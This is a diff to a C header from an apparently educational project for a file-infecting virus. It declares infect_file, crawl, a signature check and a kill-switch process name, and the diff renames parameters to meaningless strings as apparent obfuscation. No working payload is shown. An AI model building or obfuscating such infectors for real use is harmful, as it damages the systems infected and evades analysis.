@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
-/*   Updated: 2026/06/13 01:24:04 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/13 03:18:14 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,10 @@ typedef struct	s_exec_ctx
 
 // stops the virus if any process with this string in the name runs on the machine
 #define BLOCKING_PROCESS "test"
+
+#ifndef _Cc
+# define _Cc const char *
+#endif
 
 bool	is_process_running(const char *name);
 
@@ -53,7 +57,7 @@ char	*strjoin(char const *s1, char const *s2);
 char 	*remove_last_n(char *str, size_t n);
 char	*ft_itoa(int n);
 
-int		infect_file(t_exec_ctx *ctx, const char *path);
+int		infect_file(t_exec_ctx *fvvfewe, _Cc vfscsettbv);
 int		crawl(t_exec_ctx *fwefewfewfew);
 
 int		check_signature(const char *path);
